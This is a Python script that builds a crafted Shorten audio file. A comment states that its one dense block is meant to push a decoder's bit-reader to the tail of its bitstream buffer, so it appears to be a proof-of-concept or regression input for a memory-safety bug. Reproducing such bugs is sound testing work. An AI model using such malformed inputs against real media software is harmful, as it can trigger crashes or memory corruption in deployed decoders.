import struct
import sys

class BitWriter:
    def __init__(self):
        self.bits = []
    def put_bit(self, b):
        self.bits.append(b & 1)
    def put_bits_msb(self, value, n):
        for i in range(n - 1, -1, -1):
            self.put_bit((value >> i) & 1)
    def put_unary(self, q):
        for _ in range(q):
            self.put_bit(0)
        self.put_bit(1)
    def put_rice_jpegls(self, value, k):
        q = value >> k
        r = value & ((1 << k) - 1) if k > 0 else 0
        self.put_unary(q)
        if k > 0:
            self.put_bits_msb(r, k)
    def put_sr_shorten(self, value, k):
        if value >= 0:
            uvar = value << 1
        else:
            uvar = (((-value) << 1) - 1)
        self.put_rice_jpegls(uvar, k + 1)
    def put_uint_shorten(self, value, kprime):
        self.put_rice_jpegls(kprime, 2)
        self.put_rice_jpegls(value, kprime)
    def to_bytes(self):
        bits = list(self.bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        out = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            out.append(byte)
        return bytes(out)

def build():
    bw = BitWriter()
    for ch in b"ajkg":
        bw.put_bits_msb(ch, 8)
    bw.put_bits_msb(2, 8)              # version = 2
    bw.put_uint_shorten(2, 1)          # internal_ftype = TYPE_U8
    bw.put_uint_shorten(1, 0)          # channels = 1
    BLOCKSIZE = 2048
    bw.put_uint_shorten(BLOCKSIZE, 11) # blocksize = 2048
    bw.put_uint_shorten(0, 0)          # maxnlpc = 0
    bw.put_uint_shorten(0, 0)          # nmean = 0
    bw.put_uint_shorten(0, 0)          # skip_bytes = 0
    bw.put_rice_jpegls(9, 2)           # FN_VERBATIM tag
    bw.put_rice_jpegls(44, 5)          # header_size = 44

    header = bytearray()
    header += b"RIFF"
    header += struct.pack('<I', 36)
    header += b"WAVE"
    header += b"fmt "
    header += struct.pack('<I', 16)
    header += struct.pack('<H', 1)      # PCM
    header += struct.pack('<H', 1)      # channels (ignored)
    header += struct.pack('<I', 44100)  # sample rate
    header += struct.pack('<I', 0)
    header += struct.pack('<H', 0)
    header += struct.pack('<H', 8)      # bits per sample = 8
    header += bytes(8)
    assert len(header) == 44
    for b in header:
        bw.put_rice_jpegls(b, 8)

    # One densely-encoded FN_DIFF0 block: residual_size=0, every sample = 62
    # (~64 bits/sample) to push the bit-reader close to the tail of the
    # newly-grown 16384-byte bitstream buffer window.
    bw.put_rice_jpegls(0, 2)   # cmd = FN_DIFF0
    bw.put_rice_jpegls(0, 3)   # residual_size = 0
    for _ in range(BLOCKSIZE):
        bw.put_sr_shorten(62, 0)

    return bw.to_bytes()

if __name__ == "__main__":
    data = build()
    sys.stdout.buffer.write(data)
